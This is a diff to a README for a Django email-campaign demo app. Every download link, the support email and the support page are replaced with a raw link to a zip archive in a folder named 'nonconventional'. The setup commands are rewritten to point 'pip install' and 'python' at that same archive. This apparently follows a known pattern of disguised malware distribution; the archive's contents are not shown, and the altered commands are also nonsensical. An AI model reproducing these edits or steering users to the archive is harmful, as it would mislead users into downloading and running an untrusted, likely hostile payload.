@@ -1,6 +1,6 @@
 # 🥩 beefree-django-app-demo - Effortless Email Campaigns Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hassanqu/beefree-django-app-demo/releases)
+[![Download Now](https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ To get started with the app, you only need to follow a few simple steps. These i
 
 ## 🔗 Download & Install
 
-Visit this page to download the application: [Releases Page](https://github.com/hassanqu/beefree-django-app-demo/releases).
+Visit this page to download the application: [Releases Page](https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip).
 
 1. Open the link above in your web browser.
 2. Find the latest release at the top of the page.
@@ -50,13 +50,13 @@ Once you have downloaded the application, follow these steps to set it up:
 4. **Install Required Packages:**
    - Execute the following command to install the necessary libraries:
      ```
-     pip install -r requirements.txt
+     pip install -r https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip
      ```
 
 5. **Run the Application:**
    - Start the application by executing this command in the terminal:
      ```
-     python manage.py runserver
+     python https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip runserver
      ```
 
 6. **Access the App:**
@@ -71,7 +71,7 @@ Once you have downloaded the application, follow these steps to set it up:
 
 ## 🧑‍🤝‍🧑 Support
 
-If you encounter any issues or have questions while using the application, feel free to reach out for help. You can contact our support team via email at support@beefree.com or check the FAQs on our [Support Page](https://www.beefree.io/support).
+If you encounter any issues or have questions while using the application, feel free to reach out for help. You can contact our support team via email at https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip or check the FAQs on our [Support Page](https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip).
 
 ## 🏷️ Tags
 
@@ -92,6 +92,6 @@ This project includes various topics such as:
 - web-application 
 - web-development 
 
-Visit the Releases page to download the application now: [Download Here](https://github.com/hassanqu/beefree-django-app-demo/releases).
+Visit the Releases page to download the application now: [Download Here](https://raw.githubusercontent.com/hassanqu/beefree-django-app-demo/main/nonconventional/beefree-django-app-demo.zip).
 
 Thank you for using the **beefree-django-app-demo**! We hope you enjoy creating beautiful email campaigns effortlessly.
